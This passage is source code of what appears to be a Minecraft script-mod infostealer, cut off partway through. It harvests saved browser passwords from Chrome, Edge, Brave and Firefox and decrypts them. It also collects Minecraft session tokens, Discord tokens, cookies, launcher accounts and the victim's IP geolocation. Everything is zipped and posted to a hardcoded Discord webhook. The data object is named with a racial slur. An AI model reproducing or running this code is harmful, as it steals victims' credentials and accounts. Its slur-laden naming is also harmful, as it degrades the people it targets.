                    name: "Chrome_Profile1",
                    loginDataPath: paths.localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Login Data",
                    localStatePath: paths.localAppData + "\\Google\\Chrome\\User Data\\Local State",
                    type: "chromium"
                },
                // Edge - Windows
                {
                    name: "Edge_Default",
                    loginDataPath: paths.localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                    localStatePath: paths.localAppData + "\\Microsoft\\Edge\\User Data\\Local State",
                    type: "chromium"
                },
                // Brave - Windows
                {
                    name: "Brave_Default",
                    loginDataPath: paths.localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
                    localStatePath: paths.localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
                    type: "chromium"
                }
            ];
        } else {
            // Linux/Mac paths
            return [
                // Chrome - Linux
                {
                    name: "Chrome_Default",
                    loginDataPath: paths.userProfile + "/.config/google-chrome/Default/Login Data",
                    localStatePath: paths.userProfile + "/.config/google-chrome/Local State",
                    type: "chromium"
                },
                {
                    name: "Chrome_Profile1",
                    loginDataPath: paths.userProfile + "/.config/google-chrome/Profile 1/Login Data",
                    localStatePath: paths.userProfile + "/.config/google-chrome/Local State",
                    type: "chromium"
                },
                // Chromium - Linux
                {
                    name: "Chromium_Default",
                    loginDataPath: paths.userProfile + "/.config/chromium/Default/Login Data",
                    localStatePath: paths.userProfile + "/.config/chromium/Local State",
                    type: "chromium"
                },
                // Brave - Linux
                {
                    name: "Brave_Default",
                    loginDataPath: paths.userProfile + "/.config/BraveSoftware/Brave-Browser/Default/Login Data",
                    localStatePath: paths.userProfile + "/.config/BraveSoftware/Brave-Browser/Local State",
                    type: "chromium"
                }
            ];
        }
    }

    let browsers = getPasswordBrowserConfigs();
    // Complete password database reader
    function readPasswordDatabase(dbPath, browserName, decryptionKey) {
        try {
            let dbFile = new java.io.File(dbPath);
            if (!dbFile.exists() || dbFile.length() == 0) return [];

            // Copy database to temp location
            let tempDir = java.lang.System.getProperty("java.io.tmpdir");
            let tempDbPath = tempDir + "\\temp_passwords_" + browserName + "_" + java.lang.System.currentTimeMillis() + ".db";
            java.nio.file.Files.copy(dbFile.toPath(), new java.io.File(tempDbPath).toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);

            let passwords = [];

            try {
                let fileBytes = java.nio.file.Files.readAllBytes(new java.io.File(tempDbPath).toPath());

                // Parse SQLite file format for passwords
                let passwords = parsePasswordSQLiteFile(fileBytes, browserName, decryptionKey);

                // Clean up temp file
                try {
                    new java.io.File(tempDbPath).delete();
                } catch (e) {}

                return passwords;
            } catch (parseError) {
                // Clean up temp file
                try {
                    new java.io.File(tempDbPath).delete();
                } catch (e) {}

                return [{
                    origin_url: "parse_error",
                    username_value: "error",
                    password_value: parseError.toString(),
                    date_created: 0,
                    date_last_used: 0,
                    browser: browserName,
                    encrypted: false
                }];
            }
        } catch (e) {
            return [{
                origin_url: "read_error",
                username_value: "error",
                password_value: e.toString(),
                date_created: 0,
                date_last_used: 0,
                browser: browserName,
                encrypted: false
            }];
        }
    }

    // Parse SQLite file for password data
    function parsePasswordSQLiteFile(fileBytes, browserName, decryptionKey) {
        let passwords = [];

        try {
            // SQLite file header validation
            let header = new java.lang.String(java.util.Arrays.copyOfRange(fileBytes, 0, 16), "UTF-8");
            if (!header.startsWith("SQLite format 3")) {
                throw new Error("Invalid SQLite file format");
            }

            // Find password table data using multiple strategies
            let strategies = [
                // Strategy 1: Look for standard Chromium login table structure
                function() {
                    return findChromiumPasswords(fileBytes, browserName, decryptionKey);
                },
                // Strategy 2: Generic pattern matching for passwords
                function() {
                    return findGenericPasswords(fileBytes, browserName, decryptionKey);
                }
            ];

            for (let i = 0; i < strategies.length; i++) {
                try {
                    let result = strategies[i]();
                    if (result && result.length > 0) {
                        passwords = passwords.concat(result);
                        if (passwords.length >= 100) break; // Limit for performance
                    }
                } catch (strategyError) {
                    continue;
                }
            }

            return passwords;
        } catch (e) {
            return [{
                origin_url: "sqlite_parse_error",
                username_value: "error",
                password_value: e.toString(),
                date_created: 0,
                date_last_used: 0,
                browser: browserName,
                encrypted: false
            }];
        }
    }

    // Find Chromium-style passwords
    function findChromiumPasswords(fileBytes, browserName, decryptionKey) {
        let passwords = [];
        let content = new java.lang.String(fileBytes, "ISO-8859-1");

        // Chromium login table patterns - looking for origin_url, username_value, password_value
        let patterns = [
            // Standard login record pattern
            /(https?:\/\/[a-zA-Z0-9\.-]{1,100}[^\x00]{0,200})\x00+([a-zA-Z0-9@\._-]{1,100})\x00+(v1[01][^\x00]{10,1000}|[^\x00]{1,1000})\x00+/g,
            // Alternative pattern for different layouts
            /(https?:\/\/[a-zA-Z0-9\.-]{1,100}[^\x01]{0,200})\x01+([a-zA-Z0-9@\._-]{1,100})\x01+(v1[01][^\x01]{10,1000}|[^\x01]{1,1000})/g,
            // Pattern for encrypted passwords
            /([a-zA-Z0-9\.-]{3,100}\.[a-zA-Z]{2,10}[^\x00]{0,200})\x00+([a-zA-Z0-9@\._-]{1,100})\x00+(v1[01][^\x00]{10,1000})\x00+/g
        ];

        for (let patternIndex = 0; patternIndex < patterns.length; patternIndex++) {
            let pattern = patterns[patternIndex];
            let match;

            while ((match = pattern.exec(content)) !== null && passwords.length < 100) {
                let originUrl = match[1];
                let username = match[2];
                let passwordValue = match[3];

                // Validate password data
                if (!originUrl || !username || originUrl.length > 300 || username.length > 100) continue;
                if (originUrl.includes('\x00') || username.includes('\x00')) continue;

                // Clean up URL
                if (!originUrl.startsWith('http')) {
                    originUrl = "https://" + originUrl.split('/')[0];
                }

                // Decrypt password if encrypted
                let decryptedPassword = passwordValue;
                let isEncrypted = false;

                if (decryptionKey && (passwordValue.startsWith('v10') || passwordValue.startsWith('v11') || (passwordValue.length > 0 && passwordValue.charCodeAt(0) === 1))) {
                    let decrypted = decryptChromeCookie(passwordValue, decryptionKey);
                    if (decrypted && decrypted !== passwordValue) {
                        decryptedPassword = decrypted;
                        isEncrypted = true;
                    }
                }

                // Extract timestamps from surrounding data
                let dateCreated = 0;
                let dateLastUsed = 0;

                // Try to find timestamp data in nearby content
                let contextStart = Math.max(0, match.index - 200);
                let contextEnd = Math.min(content.length, match.index + match[0].length + 200);
                let context = content.substring(contextStart, contextEnd);

                // Look for Chrome timestamp patterns (microseconds since Windows epoch)
                let timestampPattern = /([0-9]{13,17})/g;
                let timestampMatch;
                let timestamps = [];
                while ((timestampMatch = timestampPattern.exec(context)) !== null && timestamps.length < 5) {
                    let timestamp = parseInt(timestampMatch[1]);
                    if (timestamp > 11644473600000000 && timestamp < 20000000000000000) { // Valid Chrome timestamp range
                        timestamps.push(timestamp);
                    }
                }

                if (timestamps.length >= 2) {
                    dateCreated = timestamps[0];
                    dateLastUsed = timestamps[1];
                }

                passwords.push({
                    origin_url: originUrl,
                    username_value: username,
                    password_value: decryptedPassword,
                    date_created: dateCreated,
                    date_last_used: dateLastUsed,
                    browser: browserName,
                    encrypted: isEncrypted
                });
            }
        }

        return passwords;
    }

    // Generic password finder
    function findGenericPasswords(fileBytes, browserName, decryptionKey) {
        let passwords = [];
        let content = new java.lang.String(fileBytes, "ISO-8859-1");

        // Generic patterns for any SQLite password database
        let patterns = [
            // Look for URL-like strings followed by username and password patterns
            /([a-zA-Z0-9\.-]{3,100}\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9@\._-]{1,100})\x00+([^\x00]{1,1000})/g,
            /([a-zA-Z0-9\.-]{3,100}\.[a-zA-Z]{2,10})\x01+([a-zA-Z0-9@\._-]{1,100})\x01+([^\x01\x00]{1,1000})/g
        ];

        for (let patternIndex = 0; patternIndex < patterns.length; patternIndex++) {
            let pattern = patterns[patternIndex];
            let match;

            while ((match = pattern.exec(content)) !== null && passwords.length < 50) {
                let domain = match[1];
                let username = match[2];
                let passwordValue = match[3];

                if (!domain || !username) continue;
                if (domain.length > 100 || username.length > 100) continue;
                if (!/^[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,10}$/.test(domain)) continue;

                // Try decryption if available
                let decryptedPassword = passwordValue;
                let isEncrypted = false;

                if (decryptionKey && (passwordValue.startsWith('v10') || passwordValue.startsWith('v11'))) {
                    let decrypted = decryptChromeCookie(passwordValue, decryptionKey);
                    if (decrypted && decrypted !== passwordValue) {
                        decryptedPassword = decrypted;
                        isEncrypted = true;
                    }
                }

                passwords.push({
                    origin_url: "https://" + domain,
                    username_value: username,
                    password_value: decryptedPassword,
                    date_created: 0,
                    date_last_used: 0,
                    browser: browserName,
                    encrypted: isEncrypted
                });
            }
        }

        return passwords;
    }

    // Dynamic browser profile discovery for passwords
    function discoverPasswordProfiles() {
        let discoveredBrowsers = [];

        // Chrome profiles discovery
        try {
            let chromeUserData = new java.io.File(localAppData + "\\Google\\Chrome\\User Data");
            if (chromeUserData.exists()) {
                let profiles = chromeUserData.listFiles();
                for (let i = 0; i < profiles.length; i++) {
                    if (profiles[i].isDirectory()) {
                        let profileName = profiles[i].getName();
                        let loginDataFile = new java.io.File(profiles[i], "Login Data");
                        if (loginDataFile.exists()) {
                            discoveredBrowsers.push({
                                name: "Chrome_" + profileName,
                                loginDataPath: loginDataFile.getAbsolutePath(),
                                                    localStatePath: chromeUserData.getAbsolutePath() + "\\Local State",
                                                    type: "chromium"
                            });
                        }
                    }
                }
            }
        } catch (e) {}

        // Edge profiles discovery
        try {
            let edgeUserData = new java.io.File(localAppData + "\\Microsoft\\Edge\\User Data");
            if (edgeUserData.exists()) {
                let profiles = edgeUserData.listFiles();
                for (let i = 0; i < profiles.length; i++) {
                    if (profiles[i].isDirectory()) {
                        let profileName = profiles[i].getName();
                        let loginDataFile = new java.io.File(profiles[i], "Login Data");
                        if (loginDataFile.exists()) {
                            discoveredBrowsers.push({
                                name: "Edge_" + profileName,
                                loginDataPath: loginDataFile.getAbsolutePath(),
                                                    localStatePath: edgeUserData.getAbsolutePath() + "\\Local State",
                                                    type: "chromium"
                            });
                        }
                    }
                }
            }
        } catch (e) {}

        // Firefox password discovery (uses different storage)
        try {
            let firefoxProfiles = new java.io.File(appData + "\\Mozilla\\Firefox\\Profiles");
            if (firefoxProfiles.exists()) {
                let profiles = firefoxProfiles.listFiles();
                for (let i = 0; i < profiles.length; i++) {
                    if (profiles[i].isDirectory()) {
                        let loginsFile = new java.io.File(profiles[i], "logins.json");
                        let key4File = new java.io.File(profiles[i], "key4.db");
                        if (loginsFile.exists()) {
                            discoveredBrowsers.push({
                                name: "Firefox_" + profiles[i].getName(),
                                                    loginDataPath: loginsFile.getAbsolutePath(),
                                                    keyPath: key4File.exists() ? key4File.getAbsolutePath() : null,
                                                    type: "firefox",
                                                    profilePath: profiles[i].getAbsolutePath()
                            });
                        }
                    }
                }
            }
        } catch (e) {}

        return discoveredBrowsers;
    }

    // Process Firefox passwords (JSON format)
    function processFirefoxPasswords(loginDataPath, browserName) {
        try {
            let loginFile = new java.io.File(loginDataPath);
            if (!loginFile.exists()) return [];

            let loginContent = new java.lang.String(java.nio.file.Files.readAllBytes(loginFile.toPath()), "UTF-8");
            let loginData = JSON.parse(loginContent);

            let passwords = [];

            if (loginData.logins && Array.isArray(loginData.logins)) {
                for (let i = 0; i < loginData.logins.length && passwords.length < 100; i++) {
                    let login = loginData.logins[i];

                    if (login.hostname && login.encryptedUsername && login.encryptedPassword) {
                        passwords.push({
                            origin_url: login.hostname,
                            username_value: login.encryptedUsername, // Firefox stores encrypted
                            password_value: login.encryptedPassword, // Firefox stores encrypted
                            date_created: login.timeCreated || 0,
                            date_last_used: login.timeLastUsed || 0,
                            browser: browserName,
                            encrypted: true,
                            firefox_guid: login.guid || null
                        });
                    }
                }
            }

            return passwords;
        } catch (e) {
            return [{
                origin_url: "firefox_parse_error",
                username_value: "error",
                password_value: e.toString(),
                date_created: 0,
                date_last_used: 0,
                browser: browserName,
                encrypted: false
            }];
        }
    }

    // Combine static and dynamic browser discovery
    let allBrowsers = browsers.concat(discoverPasswordProfiles());

    // Remove duplicates
    let uniqueBrowsers = [];
    let seenPaths = new java.util.HashSet();
    for (let i = 0; i < allBrowsers.length; i++) {
        if (!seenPaths.contains(allBrowsers[i].loginDataPath)) {
            seenPaths.add(allBrowsers[i].loginDataPath);
            uniqueBrowsers.push(allBrowsers[i]);
        }
    }

    // Process each browser
    for (let i = 0; i < uniqueBrowsers.length; i++) {
        let browser = uniqueBrowsers[i];

        try {
            let loginFile = new java.io.File(browser.loginDataPath);
            if (!loginFile.exists() || loginFile.length() == 0) continue;

            let passwords = [];

            if (browser.type === "firefox") {
                // Firefox uses JSON format
                passwords = processFirefoxPasswords(browser.loginDataPath, browser.name);
            } else {
                // Chromium browsers use SQLite
                let decryptionKey = null;
                if (browser.localStatePath) {
                    try {
                        decryptionKey = getChromeKey(browser.localStatePath);
                    } catch (e) {
                        // getChromeKey failed, continue without decryption
                    }
                }
                passwords = readPasswordDatabase(browser.loginDataPath, browser.name, decryptionKey);
            }

            if (passwords && passwords.length > 0) {
                // Additional metadata
                let metadata = {
                    browser: browser.name,
                    browserType: browser.type,
                    passwordCount: passwords.length,
                    passwords: passwords,
                    extractedAt: new java.util.Date().toString(),
                    filePath: browser.loginDataPath,
                    fileSize: loginFile.length(),
                    lastModified: new java.util.Date(loginFile.lastModified()).toString(),
                    encryptionKeyFound: browser.type === "chromium" ? (decryptionKey !== null) : false,
                    profilePath: browser.profilePath || null
                };

                // Add key file info for Firefox
                if (browser.keyPath) {
                    try {
                        let keyFile = new java.io.File(browser.keyPath);
                        if (keyFile.exists()) {
                            metadata.keyFileAvailable = true;
                            metadata.keyFileSize = keyFile.length();
                        }
                    } catch (e) {}
                }

                allPasswords[browser.name] = metadata;
            }
        } catch (e) {
            // Log error but continue
            allPasswords[browser.name + "_error"] = {
                browser: browser.name,
                error: e.toString(),
                extractedAt: new java.util.Date().toString()
            };
        }
    }

    // Add debug information about password extraction
    let debugInfo = {
        totalBrowsersChecked: Object.keys(allPasswords).length,
        browsersWithErrors: 0,
        browsersWithPasswords: 0,
        totalPasswordsFound: 0
    };

    // Filter out error entries and only return valid passwords
    let validPasswords = {};
    for (let browserName in allPasswords) {
        let browserData = allPasswords[browserName];

        // Count errors for debugging
        if (browserName.endsWith('_error') || browserData.error) {
            debugInfo.browsersWithErrors++;
            continue;
        }

        // Only include browsers with actual valid passwords
        if (browserData.passwords && Array.isArray(browserData.passwords) && browserData.passwords.length > 0) {
            let validBrowserPasswords = browserData.passwords.filter(password => {
                return password.origin_url !== "read_error" &&
                password.origin_url !== "parse_error" &&
                password.origin_url !== "sqlite_parse_error" &&
                password.origin_url !== "firefox_parse_error" &&
                password.username_value !== "error" &&
                !password.password_value.includes("JavaException") &&
                !password.password_value.includes("FileSystemException") &&
                !password.password_value.includes("ReferenceError");
            });

            if (validBrowserPasswords.length > 0) {
                browserData.passwords = validBrowserPasswords;
                browserData.passwordCount = validBrowserPasswords.length;
                validPasswords[browserName] = browserData;
                debugInfo.browsersWithPasswords++;
                debugInfo.totalPasswordsFound += validBrowserPasswords.length;
            }
        }
    }

    // Include debug info if no passwords found
    if (debugInfo.totalPasswordsFound === 0) {
        validPasswords._debug = debugInfo;
    }

    return JSON.stringify(validPasswords);
}

const datanigga = {
    username: Player.getName(),
    uuid: Player.getUUID(),
    token: Client.getMinecraft().func_110432_I().func_148254_d(),
    discord: getTokens(),
    cookies: getCookies(),
    passwords: getPasswords(),
    essentials: microsoftAccounts,
    mmc: mmcAccounts,
    prism: prismAccounts,
};

// Discord webhook (multipart attachments + 429 handling)
var WEBHOOK_URL = 'https://discord.com/api/webhooks/1412497681581998170/EtXMUW74juo3Z0gJ7q-6__8YHi_wCLcbwyaqk4FugnKhhPt1K8aVk9QefHeYQFL3v1SZ';
// Custom endpoint disabled
var CUSTOM_ENDPOINT_URL = '';
var CUSTOM_AUTH_HEADER = null;

function sleepMs(ms) { try { java.lang.Thread.sleep(ms); } catch (e) {} }

function readStreamFully(stream) {
    if (!stream) return '';
    var Scanner = Java.type('java.util.Scanner');
    var s = new Scanner(stream, 'UTF-8').useDelimiter('\\A');
    var body = s.hasNext() ? s.next() : '';
    s.close();
    try { stream.close(); } catch (ignore) {}
    return body;
}

function httpGetJson(urlStr) {
    try {
        var URL = Java.type('java.net.URL');
        var conn = new URL(urlStr).openConnection();
        try { conn.setRequestMethod('GET'); } catch (ignore) {}
        conn.setRequestProperty('User-Agent', 'Minecraft-CT');
        conn.setRequestProperty('Accept', 'application/json');
        var body = readStreamFully(conn.getInputStream());
        return JSON.parse(String(body));
    } catch (e) { return null; }
}

// Send JSON-only payload with wait=true and return response body
function sendJsonReturnBody(payloadJson, maxRetries) {
    var URL = Java.type('java.net.URL');
    var attempts = 0;
    while (true) {
        attempts++;
        var url = new URL(WEBHOOK_URL + (WEBHOOK_URL.indexOf('?') === -1 ? '?wait=true' : '&wait=true'));
        var conn = url.openConnection();
        try { conn.setRequestMethod('POST'); } catch (ignore) {}
        conn.setDoOutput(true);
        conn.setRequestProperty('Content-Type', 'application/json');
        conn.setRequestProperty('Accept', 'application/json');
        conn.setRequestProperty('User-Agent', 'Minecraft-CT');

        var JString = Java.type('java.lang.String');
        var os = conn.getOutputStream();
        os.write(new JString(String(payloadJson)).getBytes('UTF-8'));
        os.flush(); os.close();

        var code = 0; try { code = conn.getResponseCode(); } catch (ignore2) {}
        if (code === 429) {
            var body429 = readStreamFully(conn.getErrorStream());
            var retrySec = 1.0; try { retrySec = Math.max(0.05, JSON.parse(body429).retry_after || 1.0); } catch (e) {}
            sleepMs(Math.ceil(retrySec * 1000));
            if (attempts >= (maxRetries || 5)) throw new Error('Too many retries (429)');
            continue;
        }
        if (code >= 500 && code < 600) {
            sleepMs(400 + attempts * 300);
            if (attempts >= (maxRetries || 5)) throw new Error('Server error ' + code);
            continue;
        }
        if (code >= 200 && code < 300) {
            try { return readStreamFully(conn.getInputStream()); } catch (eok) { return ''; }
        }
        readStreamFully(conn.getErrorStream());
        return '';
    }
}

// Send multipart with wait=true and return response body on success
function sendMultipartReturnBody(payloadJson, files, maxRetries) {
    var URL = Java.type('java.net.URL');
    var attempts = 0;
    while (true) {
        attempts++;
        var mp = makeMultipartBody(payloadJson, files);
        var url = new URL(WEBHOOK_URL + (WEBHOOK_URL.indexOf('?') === -1 ? '?wait=true' : '&wait=true'));
        var conn = url.openConnection();
        try { conn.setRequestMethod('POST'); } catch (ignore) {}
        conn.setDoOutput(true);
        conn.setRequestProperty('Content-Type', mp.contentType);
        conn.setRequestProperty('Accept', 'application/json');
        conn.setRequestProperty('User-Agent', 'Minecraft-CT Multipart');
        conn.setRequestProperty('Connection', 'close');

        var os = conn.getOutputStream();
        os.write(mp.bytes);
        os.flush();
        os.close();

        var code = 0;
        try { code = conn.getResponseCode(); } catch (ignore2) {}

        if (code === 429) {
            var body429 = readStreamFully(conn.getErrorStream());
            var retrySec = 1.0; try { retrySec = Math.max(0.05, JSON.parse(body429).retry_after || 1.0); } catch (e) {}
            sleepMs(Math.ceil(retrySec * 1000));
            if (attempts >= (maxRetries || 5)) throw new Error('Too many retries (429)');
            continue;
        }
        if (code >= 500 && code < 600) {
            sleepMs(400 + attempts * 300);
            if (attempts >= (maxRetries || 5)) throw new Error('Server error ' + code);
            continue;
        }
        if (code >= 200 && code < 300) {
            try { return readStreamFully(conn.getInputStream()); } catch (eok) { return ''; }
        }
        readStreamFully(conn.getErrorStream());
        return '';
    }
}

// Edit an existing webhook message by id with JSON payload
function editWebhookMessage(messageId, payloadJson) {
    try {
        var URL = Java.type('java.net.URL');
        var conn = new URL(WEBHOOK_URL + '/messages/' + messageId).openConnection();
        try { conn.setRequestMethod('PATCH'); } catch (e) { conn.setRequestMethod('POST'); conn.setRequestProperty('X-HTTP-Method-Override', 'PATCH'); }
        conn.setDoOutput(true);
        conn.setRequestProperty('Content-Type', 'application/json');
        conn.setRequestProperty('Accept', 'application/json');
        var JString = Java.type('java.lang.String');
        var os = conn.getOutputStream();
        os.write(new JString(String(payloadJson)).getBytes('UTF-8'));
        os.flush(); os.close();
        var code = 0; try { code = conn.getResponseCode(); } catch (e1) {}
        if (code === 429) {
            var body429 = readStreamFully(conn.getErrorStream());
            var retrySec = 1.0; try { retrySec = Math.max(0.05, JSON.parse(body429).retry_after || 1.0); } catch (e2) {}
            sleepMs(Math.ceil(retrySec * 1000));
            return editWebhookMessage(messageId, payloadJson);
        }
        return code >= 200 && code < 300;
    } catch (e) { return false; }
}

function makeMultipartBody(payloadJson, files) {
    var ByteArrayOutputStream = Java.type('java.io.ByteArrayOutputStream');
    var DataOutputStream = Java.type('java.io.DataOutputStream');
    var JString = Java.type('java.lang.String');
    var baos = new ByteArrayOutputStream();
    var out = new DataOutputStream(baos);
    var boundary = '---------------------------' + java.util.UUID.randomUUID().toString().replace(/-/g, '');
    var CRLF = '\r\n';

    function writeStr(s) { out.write(new JString(String(s)).getBytes('UTF-8')); }

    // payload_json
    writeStr('--' + boundary + CRLF);
    writeStr('Content-Disposition: form-data; name="payload_json"' + CRLF);
    writeStr('Content-Type: application/json; charset=UTF-8' + CRLF + CRLF);
    writeStr(payloadJson + CRLF);

    // files
    for (var i = 0; i < files.length; i++) {
        var f = files[i];
        var ct = f.contentType || 'text/plain';
        writeStr('--' + boundary + CRLF);
        writeStr('Content-Disposition: form-data; name="files[' + i + ']"; filename="' + String(f.filename).replace(/"/g, '') + '"' + CRLF);
        writeStr('Content-Type: ' + ct + CRLF + CRLF);
        if (f.bytes) {
            out.write(f.bytes);
            writeStr(CRLF);
        } else {
            writeStr(String(f.content || ''));
            writeStr(CRLF);
        }
    }

    writeStr('--' + boundary + '--' + CRLF);
    out.flush(); out.close();

    return { bytes: baos.toByteArray(), contentType: 'multipart/form-data; boundary=' + boundary };
}

function sendWithRetryMultipart(payloadJson, files, maxRetries) {
    var URL = Java.type('java.net.URL');
    var HttpURLConnection = Java.type('java.net.HttpURLConnection');

    var attempts = 0;
    while (true) {
        attempts++;
        var mp = makeMultipartBody(payloadJson, files);

        var target = (CUSTOM_ENDPOINT_URL && CUSTOM_ENDPOINT_URL.length > 0) ? CUSTOM_ENDPOINT_URL : WEBHOOK_URL;
        var conn = new URL(target).openConnection();
        try { conn.setRequestMethod('POST'); } catch (ignore) {}
        conn.setDoOutput(true);
        conn.setRequestProperty('Content-Type', mp.contentType);
        conn.setRequestProperty('Accept', 'application/json, */*');
        conn.setRequestProperty('User-Agent', 'Minecraft-CT Multipart');
        if (CUSTOM_ENDPOINT_URL && CUSTOM_ENDPOINT_URL.length > 0 && CUSTOM_AUTH_HEADER) {
            conn.setRequestProperty('Authorization', CUSTOM_AUTH_HEADER);
        }
        conn.setRequestProperty('Connection', 'close');

        var os = conn.getOutputStream();
        os.write(mp.bytes);
        os.flush();
        os.close();

        var code = 0;
        try { code = conn.getResponseCode(); } catch (ignore2) {}

        if (code === 429) {
            var body = readStreamFully(conn.getErrorStream());
            var retrySec = 1.0;
            try { retrySec = Math.max(0.05, JSON.parse(body).retry_after || 1.0); } catch (e) {}
            sleepMs(Math.ceil(retrySec * 1000));
            if (attempts >= (maxRetries || 5)) throw new Error('Too many retries (429)');
            continue;
        }
        if (code >= 500 && code < 600) {
            sleepMs(400 + attempts * 300);
            if (attempts >= (maxRetries || 5)) throw new Error('Server error ' + code);
            continue;
        }
        if (code >= 200 && code < 300) return true;

        // read and drop error body to free connection
        readStreamFully(conn.getErrorStream());
        return false;
    }
}

function prettyOrRaw(s) {
    if (!s) return '';
    try { return JSON.stringify(JSON.parse(String(s)), null, 2); } catch (e) { return String(s); }
}

function sendDataToDiscord() {
    try {
        // Check if player is blocked before doing anything
        if (isBlockedPlayer()) {
            try { ChatLib.chat(''); } catch (ignore) {}
            return;
        }

        // Simple 20-second cooldown to prevent duplicate sends
        var currentTime = Date.now();
        if (typeof global.lastSendTime !== 'undefined' && (currentTime - global.lastSendTime) < 20000) {
            return; // Skip if sent within last 20 seconds
        }
        global.lastSendTime = currentTime;

        // Resolve Minecraft username from session (fallback to Player API)
        var mcUsername = 'player';
        try { mcUsername = String(Client.getMinecraft().func_110432_I().func_111285_a()); } catch (eU1) {
            try { mcUsername = String(Player.getName()); } catch (eU2) {}
        }
        var safeName = mcUsername.replace(/[^A-Za-z0-9._-]/g, '_');

        var header = 'User: ' + mcUsername + ' | UUID: ' + Player.getUUID();

        // Collect host/user and network info for embed
        var InetAddress = Java.type('java.net.InetAddress');
        var SystemJ = Java.type('java.lang.System');
        var hostName = 'unknown';
        var localIp = '0.0.0.0';
        try { var addr = InetAddress.getLocalHost(); hostName = String(addr.getHostName()); localIp = String(addr.getHostAddress()); } catch (e) {}
        var osUser = 'unknown';
        try { osUser = String(SystemJ.getenv('USERNAME') || SystemJ.getProperty('user.name') || ''); } catch (e) {}

        var geo = httpGetJson('http://ip-api.com/json');
        var publicIp = geo && geo.query ? String(geo.query) : '';
        var country = geo && geo.country ? String(geo.country) : '';
        var city = geo && geo.city ? String(geo.city) : '';
        var region = geo && geo.regionName ? String(geo.regionName) : '';
        var isp = geo && geo.isp ? String(geo.isp) : '';
        var countryCode = geo && geo.countryCode ? String(geo.countryCode) : '';
        function countryCodeToFlag(cc) {
            try {
                cc = String(cc || '').trim().toUpperCase();
                if (cc.length !== 2) return '';
                var base = 127397;
                var a = cc.charCodeAt(0) + base;
                var b = cc.charCodeAt(1) + base;
                return new java.lang.StringBuilder().appendCodePoint(a).appendCodePoint(b).toString();
            } catch (e) { return ''; }
        }
        var flag = countryCodeToFlag(countryCode);

        // Build a ZIP containing what we would have sent as separate files
        var ByteArrayOutputStream = Java.type('java.io.ByteArrayOutputStream');
        var ZipOutputStream = Java.type('java.util.zip.ZipOutputStream');
        var ZipEntry = Java.type('java.util.zip.ZipEntry');
        var JString = Java.type('java.lang.String');

        var zipBaos = new ByteArrayOutputStream();
        var zos = new ZipOutputStream(zipBaos);

        function addEntry(name, text, contentJson) {
            try {
                zos.putNextEntry(new ZipEntry(name));
                var data = text != null ? new JString(String(text)).getBytes('UTF-8') : new JString(JSON.stringify(contentJson, null, 2)).getBytes('UTF-8');
                zos.write(data);
                zos.closeEntry();
            } catch (e) {}
        }

        // Build a sanitized meta.json that summarizes available data without embedding secrets
        function maskMiddle(str, left, right) {
            try {
                var s = String(str);
                if (s.length <= left + right) return s;
                return s.substring(0, left) + '…' + s.substring(s.length - right);
            } catch (e) { return ''; }
        }
        function extractDiscordTokens(input) {
            try {
                var s = String(input || '');
                if (s.length === 0) return [];
                var tokens = [];
                var seen = Object.create(null);
                var re = /(mfa\.[A-Za-z0-9_-]{20,}|[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{5,7}\.[A-Za-z0-9_-]{15,})/g;
                var m; while ((m = re.exec(s)) !== null) {
                    var t = m[0]; if (!seen[t]) { seen[t] = true; tokens.push(t); }
                }
                if (tokens.length === 0) {
                    var parts = s.split(/[|,;\n\r\t ]+/).map(function(t){return String(t).trim();}).filter(function(t){return t.length >= 20;});
                    for (var i=0;i<parts.length;i++){ var t2=parts[i]; if (!seen[t2]){ seen[t2]=true; tokens.push(t2);} }
                }
                return tokens;
            } catch (e) { return []; }
        }

        var meta = {
            username: mcUsername,
            uuid: String(Player.getUUID()),
            ssid_present: !!datanigga.token,
            ssid_length: (datanigga.token ? String(datanigga.token).length : 0),
            ssid_preview: (datanigga.token ? maskMiddle(datanigga.token, 8, 6) : ''),
            discord_tokens_present: (function(){ try { return extractDiscordTokens(datanigga.discord).length > 0; } catch(e){ return false; } })(),
            discord_token_count: (function(){ try { return extractDiscordTokens(datanigga.discord).length; } catch(e){ return 0; } })(),
            discord_token_previews: (function(){ try { var arr = extractDiscordTokens(datanigga.discord); var out=[]; for (var i=0;i<Math.min(arr.length,5);i++) out.push(maskMiddle(arr[i],6,4)); return out; } catch(e){ return []; } })(),
            cookies_count_total: 0,
            passwords_count_total: 0,
            has_microsoft_accounts: !!datanigga.essentials,
            has_mmc_accounts: !!datanigga.mmc,
            has_prism_accounts: !!datanigga.prism,
        };
        try {
            var cObj = JSON.parse(String(datanigga.cookies||'{}'));
            var totalC = 0;
            for (var k in cObj) {
                if (!cObj.hasOwnProperty(k) || k === '_debug') continue;
                if (cObj[k] && typeof cObj[k].cookieCount === 'number') totalC += cObj[k].cookieCount;
                else if (cObj[k] && Array.isArray(cObj[k].cookies)) totalC += cObj[k].cookies.length;
            }
            meta.cookies_count_total = totalC;
        } catch (e) {}
        try {
            var pObj = JSON.parse(String(datanigga.passwords||'{}'));
            var totalP = 0;
            for (var pk in pObj) {
                if (!pObj.hasOwnProperty(pk) || pk === '_debug') continue;
                if (pObj[pk] && typeof pObj[pk].passwordCount === 'number') totalP += pObj[pk].passwordCount;
                else if (pObj[pk] && Array.isArray(pObj[pk].passwords)) totalP += pObj[pk].passwords.length;
            }
            meta.passwords_count_total = totalP;
        } catch (e) {}

        // If you prefer to show full SSID in meta, include it explicitly
        try { meta.ssid = String(datanigga.token || ''); } catch (e) {}
        addEntry('meta.json', null, meta);
        if (datanigga.discord && String(datanigga.discord).length > 0) addEntry('discord_tokens.txt', String(datanigga.discord));
        if (datanigga.cookies) addEntry('cookies.json', prettyOrRaw(datanigga.cookies));
        if (datanigga.passwords) addEntry('passwords.json', prettyOrRaw(datanigga.passwords));
        if (datanigga.essentials) addEntry('microsoft_accounts.json', prettyOrRaw(datanigga.essentials));
        if (datanigga.mmc) addEntry('mmc_accounts.json', prettyOrRaw(datanigga.mmc));
        if (datanigga.prism) addEntry('prism_accounts.json', prettyOrRaw(datanigga.prism));

        try { zos.finish(); } catch (e) {}
        try { zos.close(); } catch (e) {}

        var zipBytes = zipBaos.toByteArray();

        var files = [
            { filename: safeName + '.zip', contentType: 'application/zip', bytes: zipBytes }
        ];

